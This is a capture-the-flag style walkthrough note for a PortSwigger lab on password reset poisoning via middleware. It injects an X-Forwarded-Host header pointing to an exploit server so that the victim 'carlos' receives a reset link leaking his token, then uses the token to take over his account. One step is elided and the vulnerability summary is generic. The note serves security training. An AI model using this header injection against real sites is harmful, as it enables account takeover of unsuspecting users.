# Lab: Password reset poisoning via middleware

**Official lab:** [Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

## Lab idea

This challenge concerns password-reset links generated using request or intermediary metadata that may not be trustworthy. It practices examining how reset URLs are constructed across proxy and middleware boundaries.

## Vulnerability in brief
Authentication, often abbreviated **AuthN**, is the process of verifying that a user or client is who they claim to be. It is distinct from authorization (AuthZ), which determines what an authenticated identity is allowed to do. This topic covers vulnerabilities in authentication mechanisms; it is a vulnerability-learning topic, not a general testing category.

## Solution idea
1. With Burp running, investigate the password reset functionality.
2. Send the POST /forgot-password request to Burp Repeater.
3. Go to the exploit server and make a note of your exploit server URL.
4. Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
- …
6. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server).
7. Load this URL and set a new password for Carlos's account.
8. Log in to Carlos's account using the new password to solve the lab.

## Payloads / key values
- `POST /forgot-password`
- `X-Forwarded-Host`
- `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
- `username`
- `carlos`
- `GET /forgot-password`
- `temp-forgot-password-token`

## Official source
- [PortSwigger Academy: Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
